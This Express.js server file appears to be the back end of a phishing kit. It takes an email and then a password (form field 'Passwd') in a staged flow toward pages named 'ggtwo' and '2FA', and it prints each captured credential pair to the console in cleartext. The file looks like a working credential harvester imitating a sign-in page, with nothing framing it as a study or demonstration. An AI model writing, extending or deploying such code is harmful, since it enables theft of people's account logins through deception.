const express = require("express");

const app = express();
app.set("views", "views");
app.set("view engine", "ejs");
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("index", { title: "Express" });
});

class Person {
  constructor(email, password) {
    this.email = email;
    this.password = password;
  }

  // getter
  get personEmail() {
    return this.email;
  }
  get personPassword() {
    return this.password;
  }

  // setter
  set personEmail(x) {
    this.email = x;
  }
  set personPassword(y) {
    this.password = y;
  }
}

let konto = new Person("", "");

app.post("/email", function (req, res) {
  konto.email = req.body.email;
  console.log(konto);

  res.render("ggtwo", {
    konto: konto,
  });
});

app.post("/password", function (req, res) {
  konto.password = req.body.Passwd;
  console.log(konto);
  res.render("2FA", {
    konto: konto,
  });
});

app.listen(3000, () => {
  console.log("Express is running on port 3000");
});
